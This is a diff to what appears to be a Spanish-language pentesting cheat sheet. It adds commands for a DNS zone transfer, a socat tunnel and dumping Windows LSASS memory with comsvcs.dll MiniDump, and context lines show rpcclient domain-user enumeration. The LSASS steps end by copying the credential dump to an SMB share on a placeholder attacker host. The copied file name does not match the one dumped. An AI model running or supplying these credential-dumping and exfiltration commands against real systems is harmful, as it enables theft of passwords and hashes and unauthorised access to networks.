@@ -27,9 +27,13 @@ nmap -sn network/address
 ```
 wget https://raw.githubusercontent.com/CronoX1/Host-Discovery/main/Host-Discovery.py
 ```
-### Remote Port Tunneling
+#### Remote Port Tunneling
 ```
 socat TCP-LISTEN:LISTENNING_PORT,fork sctp:REMOTE_IP:REMOTE_PORT
+```
+#### Domain Zone Transfer (AXFR)
+```
+dig @IP dominio axfr
 ```
 # Web
 
@@ -444,6 +448,19 @@ rpcclient -U 'domain.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?
 
 ```
 for rid in $(rpcclient -U 'dominio.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'| tr -d '[]'); do echo -e "\n[+] Para el RID $rid:\n";  rpcclient -U 'dominio.local\user%password' IP -c "queryuser $rid" | grep -E -i "user name|description" ;done
+```
+### Dumpear LSASS
+Obtener el ID del proceso
+```
+(Get-Process lsass).id
+```
+Dumpear el LSASS
+```
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump ID_del_Proceso lsass.dmp full
+```
+Levantar un servidor smb
+```
+cp lsass.dump \\IP_ATACANTE\share\lsass.dmp
 ```
 ### ldapdomaindump
 
